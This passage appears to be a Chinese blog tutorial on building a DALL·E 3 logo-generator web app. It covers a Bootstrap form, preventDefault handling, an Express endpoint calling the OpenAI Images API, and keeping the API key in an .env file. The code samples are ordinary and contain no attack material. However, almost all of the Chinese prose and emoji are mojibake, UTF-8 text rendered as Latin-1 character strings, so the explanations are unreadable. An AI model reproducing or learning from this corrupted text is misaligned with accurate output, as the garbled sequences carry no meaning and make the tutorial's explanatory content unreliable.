å‡åœ°å±•å¼€è¯¦ç»†è®²è§£</strong>ï¼Œå¹¶è¡¥å……æ‰€æœ‰ç›¸å…³çš„æŠ€æœ¯ç»†èŠ‚ï¼Œæ¶µç›–å‰ç«¯å¸ƒå±€ã€è¡¨å•è®¾è®¡ã€æ— éšœç¢è®¿é—®ã€API è°ƒç”¨ã€LLM é›†æˆã€å®‰å…¨å®è·µç­‰å¤šä¸ªç»´åº¦ã€‚å‡†å¤‡å¥½äº†å—ï¼ŸLetâ€™s go! ğŸš€</p>
<hr/>
<h2 data-id="heading-0">ğŸ§© 1. é¡¹ç›®ç›®æ ‡ï¼šLogo ç”Ÿæˆ Bot</h2>
<p>æ ¹æ® <code>index.html</code> ä¸­çš„ä¿¡æ¯ï¼š</p>
<pre><code class="hljs language-html" lang="html">Document
Botåç§°ï¼š Botæè¿°ï¼š ç”Ÿæˆå›¾æ ‡
</code></pre>
<p>æˆ‘ä»¬å¯ä»¥æ˜ç¡®è¿™ä¸ªé¡¹ç›®çš„ <strong>æ ¸å¿ƒåŠŸèƒ½</strong> æ˜¯ï¼š</p>
<blockquote>
<p>ç”¨æˆ·è¾“å…¥ä¸€æ®µæ–‡æœ¬ï¼ˆå¦‚â€œç§‘æŠ€å…¬å¸ logoâ€ï¼‰ï¼Œç³»ç»Ÿè°ƒç”¨ AI æ¨¡å‹ï¼ˆå¦‚ DALLÂ·E 3ï¼‰ï¼Œè‡ªåŠ¨ç”Ÿæˆå¯¹åº”çš„ Logo å›¾åƒã€‚</p>
</blockquote>
<p>è¿™æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ª <strong>AIGCï¼ˆAI Generated Contentï¼‰åº”ç”¨</strong>ï¼Œç»“åˆäº†å‰ç«¯äº¤äº’ä¸åç«¯å¤§æ¨¡å‹ APIã€‚</p>
<hr/>
<h2 data-id="heading-1">ğŸ–¼ï¸ 2. é€‰æ‹©åˆé€‚çš„ AI æ¨¡å‹ï¼šDALLÂ·E 3</h2>
<p><code>readme.md</code> ä¸­æ˜ç¡®æŒ‡å‡ºï¼š</p>
<blockquote>
<p>coze logo ç”Ÿæˆé€‰æ‹©åˆé€‚çš„æ¨¡å‹ dalle-e-3</p>
</blockquote>
<h3 data-id="heading-2">âœ… ä¸ºä»€ä¹ˆé€‰ DALLÂ·E 3ï¼Ÿ</h3>
<ul>
<li><strong>é«˜åˆ†è¾¨ç‡å›¾åƒç”Ÿæˆ</strong>ï¼šæ”¯æŒ 1024Ã—1024ã€1792Ã—1024 ç­‰å¤šç§å°ºå¯¸ã€‚</li>
<li><strong>æ–‡æœ¬ç†è§£èƒ½åŠ›å¼º</strong>ï¼šèƒ½ç²¾å‡†è§£æå¤æ‚ promptï¼Œå¦‚â€œæç®€é£æ ¼çš„è“è‰²ç§‘æŠ€æ„Ÿ logoï¼ŒåŒ…å«ç”µè·¯å›¾æ¡ˆâ€ã€‚</li>
<li><strong>OpenAI å®˜æ–¹æ”¯æŒ</strong>ï¼šé€šè¿‡ <a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.openai.com%2Fdocs%2Fguides%2Fimages" target="_blank" title="https://platform.openai.com/docs/guides/images" ref="nofollow noopener noreferrer">OpenAI Images API</a> å¯ç›´æ¥è°ƒç”¨ã€‚</li>
</ul>
<h3 data-id="heading-3">ğŸ”§ è°ƒç”¨æ–¹å¼ï¼ˆè¡¥å……ï¼‰</h3>
<p>ä½¿ç”¨ OpenAI çš„ Node.js SDKï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">OpenAI</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"openai"</span>;

<span class="hljs-keyword">const</span> openai = <span class="hljs-keyword">new</span> <span class="hljs-title class_">OpenAI</span>({ <span class="hljs-attr">apiKey</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">OPENAI_API_KEY</span> });

<span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> openai.<span class="hljs-property">images</span>.<span class="hljs-title function_">generate</span>({
  <span class="hljs-attr">model</span>: <span class="hljs-string">"dall-e-3"</span>,
  <span class="hljs-attr">prompt</span>: input, <span class="hljs-comment">// â† è¿™å°±æ˜¯ {{input}}</span>
  <span class="hljs-attr">n</span>: <span class="hljs-number">1</span>,
  <span class="hljs-attr">size</span>: <span class="hljs-string">"1024x1024"</span>
});

<span class="hljs-keyword">const</span> imageUrl = response.<span class="hljs-property">data</span>[<span class="hljs-number">0</span>].<span class="hljs-property">url</span>;
</code></pre>
<blockquote>
<p>ğŸ’¡ æ³¨æ„ï¼š<code>{{input}}</code> æ˜¯æ¨¡æ¿è¯­æ³•ï¼Œé€šå¸¸åœ¨å‰ç«¯æˆ–æœåŠ¡ç«¯æ¨¡æ¿å¼•æ“ä¸­è¢«æ›¿æ¢ä¸ºç”¨æˆ·å®é™…è¾“å…¥ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-4">ğŸŒ 3. å‰ç«¯é¡µé¢ç»“æ„ï¼šBootstrap + HTML5 è¡¨å•</h2>
<p><code>readme.md</code> æåˆ°äº†å¤§é‡å‰ç«¯æŠ€æœ¯è¦ç‚¹ï¼Œæˆ‘ä»¬é€ä¸€å±•å¼€ã€‚</p>
<h3 data-id="heading-5">ğŸ“¦ ä½¿ç”¨ Bootstrap æ ·å¼åº“</h3>
<blockquote>
<p>CSS: <a href="https://link.juejin.cn?target=https%3A%2F%2Fv2.bootcss.com%2Fbase-css.html" target="_blank" title="https://v2.bootcss.com/base-css.html" ref="nofollow noopener noreferrer">v2.bootcss.com/base-css.htâ€¦</a></p>
</blockquote>
<p>è¿™æ˜¯ <strong>Bootstrap v2 çš„ä¸­æ–‡ CDN</strong>ï¼ˆç°å·²è¢« v5 å–ä»£ï¼Œä½†åŸç†ç›¸é€šï¼‰ã€‚æˆ‘ä»¬é‡‡ç”¨ç°ä»£å®è·µï¼Œä½¿ç”¨ <strong>Bootstrap 5</strong> æ„å»ºå“åº”å¼å¸ƒå±€ã€‚</p>
<h4 data-id="heading-6">ğŸ—ï¸ é¡µé¢å®¹å™¨å¸ƒå±€</h4>
<blockquote>
<p><code>.container PCç«¯é¡µé¢çš„layout ä¸­é—´å®½åº¦ï¼Œ.row å·¦å³margin:auto;</code></p>
</blockquote>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"row justify-content-center"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col-md-6"</span>&gt;</span>
      <span class="hljs-comment">&lt;!-- è¡¨å•æ”¾è¿™é‡Œ --&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<ul>
<li><code>.container</code>ï¼šå›ºå®šå®½åº¦ï¼ˆå¦‚ 1140px åœ¨å¤§å±ï¼‰ï¼Œå±…ä¸­ã€‚</li>
<li><code>.row</code> + <code>justify-content-center</code>ï¼šå®ç°æ°´å¹³å±…ä¸­ï¼ˆæ¯”æ‰‹åŠ¨å†™ <code>margin: auto</code> æ›´è¯­ä¹‰åŒ–ï¼‰ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-7">ğŸ“ HTML5 è¡¨å•æœ€ä½³å®è·µ</h3>
<p><code>readme.md</code> å¼ºè°ƒäº†ä»¥ä¸‹å…³é”®ç‚¹ï¼š</p>
<h4 data-id="heading-8">âœ… å¿…å¡«å­—æ®µï¼š<code>required</code> å±æ€§</h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"prompt"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"prompt"</span> <span class="hljs-attr">required</span>&gt;</span>
</code></pre>
<ul>
<li>æµè§ˆå™¨ä¼šè‡ªåŠ¨é˜»æ­¢æäº¤ç©ºå€¼ï¼Œå¹¶æç¤ºç”¨æˆ·ã€‚</li>
</ul>
<h4 data-id="heading-9">ğŸ’¬ å ä½ç¬¦æç¤ºï¼š<code>placeholder</code></h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"è¯·è¾“å…¥ Logo æè¿°ï¼Œä¾‹å¦‚ï¼šæç®€é£å’–å•¡åº— logo"</span>&gt;</span>
</code></pre>
<ul>
<li>æå‡ç”¨æˆ·ä½“éªŒï¼Œå°¤å…¶å¯¹â€œå°ç™½ç”¨æˆ·â€å‹å¥½ ğŸ‘¶ã€‚</li>
</ul>
<h4 data-id="heading-10">â™¿ æ— éšœç¢è®¿é—®ï¼ˆAccessibilityï¼‰ï¼š<code>&lt;label for="id"&gt;</code></h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"prompt"</span>&gt;</span>Logo æè¿°<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"prompt"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"prompt"</span> <span class="hljs-attr">required</span>&gt;</span>
</code></pre>
<ul>
<li><strong>ä¸ºä»€ä¹ˆé‡è¦ï¼Ÿ</strong>
<ul>
<li>å±å¹•é˜…è¯»å™¨ï¼ˆå¦‚ JAWSã€VoiceOverï¼‰èƒ½æ­£ç¡®æœ—è¯»æ ‡ç­¾ã€‚</li>
<li>ç‚¹å‡» label å¯èšç„¦ inputï¼Œæå‡ç§»åŠ¨ç«¯ä½“éªŒã€‚</li>
</ul>
</li>
<li>å¤§å‚ï¼ˆå¦‚ Googleã€Appleã€é˜¿é‡Œï¼‰å¼ºåˆ¶è¦æ±‚æ— éšœç¢åˆè§„ï¼ˆWCAG æ ‡å‡†ï¼‰âœ…ã€‚</li>
</ul>
<h4 data-id="heading-11">ğŸ“‚ è¡¨å•åˆ†ç»„ï¼š<code>.form-group</code></h4>
<blockquote>
<p><code>.form-group è¡¨å•ç»„ï¼Œmargin-bottom: 15px;</code></p>
</blockquote>
<p>è™½ç„¶ Bootstrap 5 å·²å¼ƒç”¨ <code>.form-group</code>ï¼Œä½†å…¶æ€æƒ³ä»é€‚ç”¨ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mb-3"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"prompt"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-label"</span>&gt;</span>Logo æè¿°<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-control"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"prompt"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"prompt"</span> <span class="hljs-attr">required</span> 
         <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"ä¾‹å¦‚ï¼šè“è‰²ç§‘æŠ€æ„Ÿ AI å…¬å¸ logo"</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<ul>
<li><code>mb-3</code> = margin-bottom: 1remï¼ˆâ‰ˆ16pxï¼‰ï¼Œè§†è§‰ä¸Šåˆ†éš”è¡¨å•é¡¹ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-12">ğŸš« é˜»æ­¢é»˜è®¤æäº¤è¡Œä¸ºï¼š<code>event.preventDefault()</code></h3>
<blockquote>
<p>ç‚¹å‡»æŒ‰é’®ï¼Œè¡¨å•çš„æäº¤ form é»˜è®¤æäº¤åˆ° action ä¸ºç©ºå°±æ˜¯å½“å‰é¡µé¢<br/>
event.preventDefault() é˜»æ­¢è¡¨å•çš„é»˜è®¤æäº¤</p>
</blockquote>
<h4 data-id="heading-13">âŒ é»˜è®¤è¡Œä¸ºçš„é—®é¢˜</h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span>&gt;</span>ç”Ÿæˆ Logo<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
</code></pre>
<ul>
<li>è‹¥ <code>action=""</code> æˆ–æœªè®¾ç½®ï¼Œè¡¨å•ä¼š <strong>åˆ·æ–°å½“å‰é¡µé¢</strong>ï¼Œä¸¢å¤±çŠ¶æ€ï¼</li>
</ul>
<h4 data-id="heading-14">âœ… æ­£ç¡®åšæ³•ï¼šJavaScript æ‹¦æˆª</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'form'</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'submit'</span>, <span class="hljs-keyword">async</span> (e) =&gt; {
  e.<span class="hljs-title function_">preventDefault</span>(); <span class="hljs-comment">// â† å…³é”®ï¼é˜»æ­¢é¡µé¢è·³è½¬/åˆ·æ–°</span>

  <span class="hljs-keyword">const</span> input = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'prompt'</span>).<span class="hljs-property">value</span>;
  <span class="hljs-comment">// è°ƒç”¨ API è·å– logo...</span>
});
</code></pre>
<hr/>
<h2 data-id="heading-15">âš™ï¸ 4. åç«¯ API é›†æˆï¼šNode.js + OpenAI</h2>
<p><code>readme.md</code> æåˆ°ï¼š</p>
<blockquote>
<p>node openai completion API<br/>
è¾“å…¥ï¼šprompt<br/>
è¾“å‡ºï¼šcompletion<br/>
llm å‘èµ·çš„apiæ¥å£è°ƒç”¨ å‰ç«¯ç•Œé¢ api LLM<br/>
POST è¯·æ±‚<br/>
apikey åŠ å¯†</p>
</blockquote>
<h3 data-id="heading-16">ğŸ” å®Œæ•´æ•°æ®æµ</h3>
<pre><code class="hljs language-css" lang="css">å‰ç«¯ (<span class="hljs-selector-tag">HTML</span>/JS) 
  â†’ POST /generate-logo { prompt: <span class="hljs-string">"..."</span> } 
  â†’ Node<span class="hljs-selector-class">.js</span> æœåŠ¡ç«¯ 
  â†’ è°ƒç”¨ OpenAI Images API (DALLÂ·E <span class="hljs-number">3</span>) 
  â†’ è¿”å›å›¾ç‰‡ URL 
  â†’ å‰ç«¯æ˜¾ç¤º &lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span>="..."&gt;
</code></pre>
<h3 data-id="heading-17">ğŸ” API Key å®‰å…¨å®è·µ</h3>
<blockquote>
<p><strong>ç»å¯¹ä¸è¦</strong> åœ¨å‰ç«¯æš´éœ² <code>OPENAI_API_KEY</code>ï¼</p>
</blockquote>
<p>âœ… æ­£ç¡®åšæ³•ï¼š</p>
<ul>
<li>å°† key å­˜åœ¨ <strong>æœåŠ¡ç«¯ç¯å¢ƒå˜é‡</strong> ä¸­ï¼ˆå¦‚ <code>.env</code> æ–‡ä»¶ï¼‰ã€‚</li>
<li>å‰ç«¯åªä¸è‡ªå·±çš„åç«¯é€šä¿¡ï¼Œåç«¯å†è°ƒç”¨ OpenAIã€‚</li>
</ul>
<pre><code class="hljs language-env" lang="env"># .env
OPENAI_API_KEY=sk-xxxxxxxxxxxxxxxxxxxxxxxx
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// server.js (Express ç¤ºä¾‹)</span>
app.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/generate-logo'</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; {
  <span class="hljs-keyword">const</span> { prompt } = req.<span class="hljs-property">body</span>;
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> openai.<span class="hljs-property">images</span>.<span class="hljs-title function_">generate</span>({
      <span class="hljs-attr">model</span>: <span class="hljs-string">"dall-e-3"</span>,
      <span class="hljs-attr">prompt</span>: prompt,
      <span class="hljs-attr">n</span>: <span class="hljs-number">1</span>,
      <span class="hljs-attr">size</span>: <span class="hljs-string">"1024x1024"</span>
    });
    res.<span class="hljs-title function_">json</span>({ <span class="hljs-attr">url</span>: response.<span class="hljs-property">data</span>[<span class="hljs-number">0</span>].<span class="hljs-property">url</span> });
  } <span class="hljs-keyword">catch</span> (error) {
    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">json</span>({ <span class="hljs-attr">error</span>: error.<span class="hljs-property">message</span> });
  }
});
</code></pre>
<hr/>
<h2 data-id="heading-18">ğŸ§ª 5. å¼€å‘ä¸æµ‹è¯•å·¥å…·ï¼šApifox</h2>
<blockquote>
<p>apifox</p>
</blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.apifox.cn%2F" target="_blank" title="https://www.apifox.cn/" ref="nofollow noopener noreferrer">Apifox</a> æ˜¯ä¸€æ¬¾å›½äº§ API åä½œå¹³å°ï¼Œé›† Postmanï¼ˆè°ƒè¯•ï¼‰ã€Swaggerï¼ˆæ–‡æ¡£ï¼‰ã€Mockï¼ˆæ¨¡æ‹Ÿï¼‰äºä¸€ä½“ã€‚</p>
<h3 data-id="heading-19">ğŸ› ï¸ å¦‚ä½•ç”¨äºæœ¬é¡¹ç›®ï¼Ÿ</h3>
<ol>
<li>å®šä¹‰ <code>/generate-logo</code> æ¥å£æ–‡æ¡£ã€‚</li>
<li>æ¨¡æ‹Ÿ OpenAI è¿”å›ï¼ˆå¼€å‘é˜¶æ®µæ— éœ€çœŸå®è°ƒç”¨ï¼‰ã€‚</li>
<li>å‰ç«¯ç›´æ¥å¯¹æ¥ Mock æ•°æ®ï¼ŒåŠ é€Ÿè”è°ƒã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-20">ğŸ§  6. AIGC ä¸ LLM çš„æœ¬è´¨ç†è§£</h2>
<blockquote>
<p>AIGC LLM çš„æœ¬è´¨</p>
</blockquote>
<ul>
<li><strong>LLMï¼ˆLarge Language Modelï¼‰</strong>ï¼šå¦‚ GPT-4ï¼Œæ“…é•¿æ–‡æœ¬ç”Ÿæˆä¸ç†è§£ã€‚</li>
<li><strong>AIGCï¼ˆAI Generated Contentï¼‰</strong>ï¼šæ³›æŒ‡ AI ç”Ÿæˆçš„å†…å®¹ï¼ŒåŒ…æ‹¬æ–‡æœ¬ï¼ˆLLMï¼‰ã€å›¾åƒï¼ˆDALLÂ·Eã€Midjourneyï¼‰ã€éŸ³é¢‘ã€è§†é¢‘ç­‰ã€‚</li>
<li><strong>æœ¬é¡¹ç›®å±äº â€œText-to-Imageâ€ AIGC åº”ç”¨</strong>ï¼Œç”± LLMï¼ˆç†è§£ promptï¼‰é©±åŠ¨å›¾åƒæ¨¡å‹ï¼ˆç”Ÿæˆ logoï¼‰ã€‚</li>
</ul>
<blockquote>
<p>ğŸ’¡ è™½ç„¶ DALLÂ·E 3 ä¸æ˜¯ä¼ ç»Ÿ LLMï¼Œä½†å®ƒå†…éƒ¨é›†æˆäº†å¼ºå¤§çš„è¯­è¨€ç†è§£æ¨¡å—ï¼Œå¯è§†ä¸º LLM ä¸æ‰©æ•£æ¨¡å‹çš„ç»“åˆä½“ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-21">ğŸ§± 7. å®Œæ•´å‰ç«¯ä»£ç ç¤ºä¾‹ï¼ˆæ•´åˆæ‰€æœ‰è¦ç‚¹ï¼‰</h2>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"zh-CN"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Logo ç”Ÿæˆ Bot<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container mt-5"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"row justify-content-center"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col-md-6"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-center mb-4"</span>&gt;</span>ğŸ¨ AI Logo ç”Ÿæˆå™¨<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"logoForm"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mb-3"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"prompt"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-label"</span>&gt;</span>è¯·è¾“å…¥ Logo æè¿°<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> 
              <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> 
              <span class="hljs-attr">class</span>=<span class="hljs-string">"form-control"</span> 
              <span class="hljs-attr">id</span>=<span class="hljs-string">"prompt"</span> 
              <span class="hljs-attr">name</span>=<span class="hljs-string">"prompt"</span> 
              <span class="hljs-attr">required</span> 
              <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"ä¾‹å¦‚ï¼šæç®€é£æ ¼çš„ç»¿è‰²ç¯ä¿å…¬å¸ logoï¼Œå«æ ‘å¶å…ƒç´ "</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-primary w-100"</span>&gt;</span>ç”Ÿæˆ Logo<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"result"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mt-4 text-center"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'logoForm'</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'submit'</span>, <span class="hljs-keyword">async</span> (e) =&gt; {
      e.<span class="hljs-title function_">preventDefault</span>();
      <span class="hljs-keyword">const</span> prompt = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'prompt'</span>).<span class="hljs-property">value</span>;
      <span class="hljs-keyword">const</span> resultDiv = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'result'</span>);
      
      resultDiv.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">'&lt;div class="spinner-border" role="status"&gt;&lt;span class="visually-hidden"&gt;åŠ è½½ä¸­...&lt;/span&gt;&lt;/div&gt;'</span>;
      
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/generate-logo'</span>, {
          <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
          <span class="hljs-attr">headers</span>: { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span> },
          <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ prompt })
        });
        <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> res.<span class="hljs-title function_">json</span>();
        <span class="hljs-keyword">if</span> (data.<span class="hljs-property">url</span>) {
          resultDiv.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">`&lt;img src="<span class="hljs-subst">${data.url}</span>" class="img-fluid rounded mt-3" alt="ç”Ÿæˆçš„ Logo"&gt;`</span>;
        } <span class="hljs-keyword">else</span> {
          <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(data.<span class="hljs-property">error</span> || <span class="hljs-string">'æœªçŸ¥é”™è¯¯'</span>);
        }
      } <span class="hljs-keyword">catch</span> (err) {
        resultDiv.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">`&lt;div class="alert alert-danger"&gt;<span class="hljs-subst">${err.message}</span>&lt;/div&gt;`</span>;
      }
    });
  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<hr/>
<h2 data-id="heading-22">âœ… æ€»ç»“ï¼šæŠ€æœ¯æ ˆå…¨æ™¯å›¾</h2>








































<table><thead><tr><th>æ¨¡å—</th><th>æŠ€æœ¯</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>å‰ç«¯</strong></td><td>HTML5 + Bootstrap 5</td><td>å“åº”å¼å¸ƒå±€ã€æ— éšœç¢è¡¨å•</td></tr><tr><td><strong>äº¤äº’</strong></td><td>JavaScript (Fetch API)</td><td>æ‹¦æˆªè¡¨å•ã€è°ƒç”¨åç«¯</td></tr><tr><td><strong>åç«¯</strong></td><td>Node.js + Express</td><td>æ¥æ”¶è¯·æ±‚ã€è°ƒç”¨ OpenAI</td></tr><tr><td><strong>AI æ¨¡å‹</strong></td><td>DALLÂ·E 3 (via OpenAI API)</td><td>æ–‡æœ¬ç”Ÿæˆ Logo å›¾åƒ</td></tr><tr><td><strong>å®‰å…¨</strong></td><td>ç¯å¢ƒå˜é‡ (.env)</td><td>ä¿æŠ¤ API Key</td></tr><tr><td><strong>å¼€å‘å·¥å…·</strong></td><td>Apifox</td><td>API è®¾è®¡ä¸æµ‹è¯•</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-23">ğŸŒˆ ç»“è¯­</h2>
<p>é€šè¿‡æœ¬æ–‡ï¼Œæˆ‘ä»¬ä¸ä»… <strong>å®Œæ•´è¿˜åŸäº† <code>readme.md</code> å’Œ <code>index.html</code> ä¸­çš„æ‰€æœ‰çŸ¥è¯†ç‚¹</strong>ï¼Œè¿˜æ·±å…¥æ‰©å±•äº†æ¯ä¸ªç¯èŠ‚çš„æŠ€æœ¯ç»†èŠ‚ä¸æœ€ä½³å®è·µã€‚ä»ä¸€ä¸ªç®€å•çš„â€œç”Ÿæˆå›¾æ ‡â€éœ€æ±‚å‡ºå‘ï¼Œæˆ‘ä»¬æ„å»ºäº†ä¸€ä¸ªèåˆç°ä»£ Web å¼€å‘ã€AI èƒ½åŠ›ä¸æ— éšœç¢è®¾è®¡çš„å®Œæ•´åº”ç”¨ã€‚</p>
<p>ç°åœ¨ï¼Œä½ å¯ä»¥è‡ªä¿¡åœ°è¯´ï¼š<strong>â€œæˆ‘èƒ½ç”¨ DALLÂ·E 3 åšä¸€ä¸ª Logo ç”Ÿæˆ Botï¼â€</strong> ğŸ’ª</p>
